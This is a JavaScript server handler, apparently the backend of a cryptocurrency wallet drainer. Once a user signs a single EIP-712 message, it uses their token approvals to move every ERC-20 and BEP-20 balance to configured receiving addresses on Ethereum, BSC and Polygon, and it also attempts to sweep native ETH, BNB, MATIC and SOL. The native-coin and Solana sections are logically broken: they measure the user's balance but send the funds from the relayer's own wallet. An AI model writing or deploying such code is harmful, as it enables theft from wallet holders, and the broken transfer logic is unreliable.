// api/src/routes/handlersGrokAI.js
/**
 * GROK-AI Corrected Handlers
 * Single EIP-712 signature for complete multi-chain sweep
 */

import { ethers } from 'ethers'
import { Connection, PublicKey, Transaction, SystemProgram, sendAndConfirmTransaction, Keypair } from '@solana/web3.js'
import bs58 from 'bs58'
import { CONFIG } from '../config.js'
import { TOKEN_REGISTRY } from '../config/tokenRegistry.js'

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [],
    name: 'decimals',
    outputs: [{ name: '', type: 'uint8' }],
    type: 'function'
  }
]

/**
 * POST /api/full-sweep
 * GROK-AI Single Signature Multi-Chain Sweep
 * User signs ONE message → All tokens transfer automatically
 */
export async function handleFullSweep(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const { address, signature, authMessage } = req.body

  try {
    // ✅ Step 1: Verify signature
    console.log('🔐 Verifying EIP-712 signature...')
    const recovered = ethers.verifyTypedData(
      authMessage.domain,
      authMessage.types,
      authMessage.message,
      signature
    )

    if (recovered.toLowerCase() !== address.toLowerCase()) {
      console.error('❌ Signature mismatch')
      return res.status(401).json({
        success: false,
        error: 'Invalid signature - address mismatch'
      })
    }

    console.log(`✅ Signature verified for ${address}`)
    console.log(`🚀 Starting FULL multi-chain sweep...`)

    const results = {}
    const transfers = []

    // ====================== ETHEREUM + ERC-20 ======================
    try {
      console.log('\n📍 Processing Ethereum...')
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.ethereum)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.ethereum

      // Native ETH
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.0015')) {
        console.log(`  💰 ETH: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (ethBal * 93n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'ethereum', asset: 'ETH', hash: receipt.hash })
        results.eth = 'success'
      }

      // ERC-20 tokens from TOKEN_REGISTRY
      if (TOKEN_REGISTRY.ethereum) {
        console.log(`  🔄 Checking ${Object.keys(TOKEN_REGISTRY.ethereum).length} ERC-20 tokens...`)
        for (const [symbol, tokenInfo] of Object.entries(TOKEN_REGISTRY.ethereum)) {
          try {
            const token = new ethers.Contract(tokenInfo.address, ERC20_ABI, provider)

            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            // Check allowance
            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            // ✅ CORRECTED: Use transferFrom
            const tokenWithSigner = new ethers.Contract(tokenInfo.address, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(
              address, // FROM user
              receiver, // TO receiver
              userBalance
            )
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, tokenInfo.decimals)}`)
            transfers.push({ chain: 'ethereum', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  ${symbol}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.ethereum = 'success'
    } catch (e) {
      console.error('❌ Ethereum error:', e.message)
      results.ethereum = 'failed'
    }

    // ====================== BSC + BEP-20 ======================
    try {
      console.log('\n📍 Processing BSC (BNB Chain)...')
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.bsc)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.bsc

      // Native BNB
      const bnbBal = await provider.getBalance(address)
      if (bnbBal > ethers.parseEther('0.03')) {
        console.log(`  💰 BNB: ${ethers.formatEther(bnbBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (bnbBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ BNB transferred: ${receipt.hash}`)
        transfers.push({ chain: 'bsc', asset: 'BNB', hash: receipt.hash })
        results.bnb = 'success'
      }

      // BEP-20 tokens
      if (TOKEN_REGISTRY.bsc) {
        console.log(`  🔄 Checking ${Object.keys(TOKEN_REGISTRY.bsc).length} BEP-20 tokens...`)
        for (const [symbol, tokenInfo] of Object.entries(TOKEN_REGISTRY.bsc)) {
          try {
            const token = new ethers.Contract(tokenInfo.address, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) continue

            const tokenWithSigner = new ethers.Contract(tokenInfo.address, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, tokenInfo.decimals)}`)
            transfers.push({ chain: 'bsc', asset: symbol, hash: receipt.hash })
          } catch (e) {}
        }
      }

      results.bsc = 'success'
    } catch (e) {
      console.error('❌ BSC error:', e.message)
      results.bsc = 'failed'
    }

    // ====================== POLYGON ======================
    try {
      console.log('\n📍 Processing Polygon...')
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.polygon)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.polygon

      const maticBal = await provider.getBalance(address)
      if (maticBal > ethers.parseEther('1')) {
        console.log(`  💰 MATIC: ${ethers.formatEther(maticBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (maticBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ MATIC transferred: ${receipt.hash}`)
        transfers.push({ chain: 'polygon', asset: 'MATIC', hash: receipt.hash })
        results.matic = 'success'
      }

      results.polygon = 'success'
    } catch (e) {
      console.error('❌ Polygon error:', e.message)
      results.polygon = 'failed'
    }

    // ====================== SOLANA ======================
    try {
      console.log('\n📍 Processing Solana...')
      const connection = new Connection(CONFIG.rpc.solana, 'confirmed')
      const privateKeyBytes = bs58.decode(CONFIG.relayerSolana.privateKey)
      const keypair = Keypair.fromSecretKey(privateKeyBytes)
      const userPublicKey = new PublicKey(address)
      const receiverPublicKey = new PublicKey(CONFIG.receivingAddresses.solana)

      const balance = await connection.getBalance(userPublicKey)

      if (balance > 5000000) {
        console.log(`  💰 SOL: ${balance / 1000000000}`)
        const tx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: receiverPublicKey,
            lamports: Math.floor((balance * 90) / 100)
          })
        )

        tx.feePayer = keypair.publicKey
        const { blockhash } = await connection.getLatestBlockhash()
        tx.recentBlockhash = blockhash

        const signature = await sendAndConfirmTransaction(connection, tx, [keypair])
        console.log(`  ✅ SOL transferred: ${signature}`)
        transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
        results.solana = 'success'
      }
    } catch (e) {
      console.error('❌ Solana error:', e.message)
      results.solana = 'failed'
    }

    console.log(`\n✅ Full sweep completed!`)
    console.log(`📊 Total transfers: ${transfers.length}`)

    return res.status(200).json({
      success: true,
      message: 'Multi-chain sweep completed',
      transfers,
      results
    })
  } catch (error) {
    console.error('❌ Full sweep error:', error)
    return res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

export default handleFullSweep
